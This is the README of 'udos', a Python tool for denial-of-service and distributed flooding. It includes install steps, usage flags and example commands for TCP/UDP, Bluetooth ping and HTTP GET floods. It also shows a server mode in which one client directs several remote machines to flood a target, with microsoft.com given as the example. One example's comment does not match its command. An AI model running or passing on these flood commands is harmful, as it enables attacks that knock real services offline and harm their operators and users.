```
usage: udos [-h] [--version] [--fork] [--run] [--stop] [--debug]
            [--socket SOCKET] [--client CLIENT] [--server] [--target TARGET]
            [--port PORT] [--bytes BYTES]

UDoS for GNU/Linux - Universal DoS and DDoS testing tool

optional arguments:
  -h, --help       show this help message and exit
  --version        Display help
  --fork           Fork to background
  --run            Execute run on remote server (to be used with --client
                   argument)
  --stop           Stop previous job
  --debug          Debugging mode
  --socket SOCKET  use TCP or UDP connection over ethernet/wireless, default
                   TCP, available TCP, UDP, RFC (bluetooth)
  --client CLIENT  Connect to comma separated client addresses
  --server         turn into a server mode that handles instructions
  --target TARGET  target adress (bluetooth mac or ip adress over
                   ethernet/wireless)
  --port PORT      destination port
  --bytes BYTES    number of bytes to send in one packet
```

Requirements
==============

- Python 2.7
- [Panthera Desktop Framework](https://github.com/Panthera-Framework/Panthera-Desktop)

Installation
==============

```
cd /tmp/
git clone https://github.com/Panthera-Framework/Panthera-Desktop
cd /tmp/Panthera-Desktop
sudo python2.7 ./setup.py install
cd /tmp/
git clone https://github.com/webnull/udos
cd /tmp/udos/
sudo python2.7 ./setup.py install
```

Examples:
==============
```bash
$ udos --target 2.2.2.2 --port 21 --socket udp --bytes 1024 # TCP flood 1.1.1.1:80 with 1024 byte packets
$ udos --target 00:11:22:33:44  --socket rfc --bytes 668 # Bluetooth ping flood 00:11:22:33:44 with 668 byte packets
$ udos --target http://localhost  --socket http --port 80  # HTTP GET flood on localhost, make many index.php requests as possible
```
Server mode examples:
==============
```bash
server1$ udos --server --debug # Run first server with verboose output, it will listen on all interfaces
server2$ udos --server --debug # Run second server on other machine with ip eg. 8.8.8.2
```

Server's remote controlling:
==============
```bash
client1$ udos --client "192.168.0.100:8020, 8.8.8.2:8020" --run --target microsoft.com --port 80 --socket http  # set parameters and fire. Commands will be sent to two servers specified in --client
```

```
Changelog:
19.06.2014 (v.2.0) <webnull.www@gmail.com>:
    + Rewrited code using Panthera Desktop Framework
    + Server mode

14.08.2011 (v.1.2) <webnull.www@gmail.com>:
    + Added support for Python 3 (now works with Python 2.6, Python 2.7, Python 3.1 and Python 3.2)
    + Added check for l2ping

19.07.2011 (v.1.1.1):
    + Added versioning information

18.07.2011 (v1.1.1):
    * Fixes and optimizations

18.07.2011 (v1.1):
    + Added support for HTTP GET flood
    + Created changelog
```
